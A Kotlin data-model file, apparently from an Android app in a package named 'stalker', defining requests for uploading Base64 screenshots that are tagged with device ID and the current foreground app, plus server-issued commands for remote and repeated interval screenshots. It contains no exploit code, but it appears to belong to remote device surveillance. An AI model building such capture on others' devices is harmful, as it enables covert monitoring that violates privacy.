package com.askqing.stalker.model

import com.google.gson.annotations.SerializedName

/**
 * 截图上传请求
 * 将截图以 Base64 形式发送到服务器
 */
data class ScreenshotUploadRequest(
    @SerializedName("device_id") val deviceId: String,
    @SerializedName("timestamp") val timestamp: Long = System.currentTimeMillis(),
    @SerializedName("image_base64") val imageBase64: String,
    @SerializedName("format") val format: String = "png",
    @SerializedName("width") val width: Int,
    @SerializedName("height") val height: Int,
    @SerializedName("current_app") val currentApp: String? = null,
    @SerializedName("trigger") val trigger: String = "manual" // manual, remote, stress_test
)

/**
 * 服务器下发的截屏命令
 */
data class ScreenshotCommand(
    @SerializedName("command") val command: String = "screenshot",
    @SerializedName("request_id") val requestId: String,
    @SerializedName("quality") val quality: Int = 80,
    @SerializedName("stress_test") val stressTest: Boolean = false,
    @SerializedName("interval_ms") val intervalMs: Int = 1000
)

/**
 * 服务器轮询返回的命令响应
 */
data class ServerCommandResponse(
    @SerializedName("has_command") val hasCommand: Boolean = false,
    @SerializedName("command") val command: String? = null,
    @SerializedName("data") val data: ScreenshotCommand? = null
)
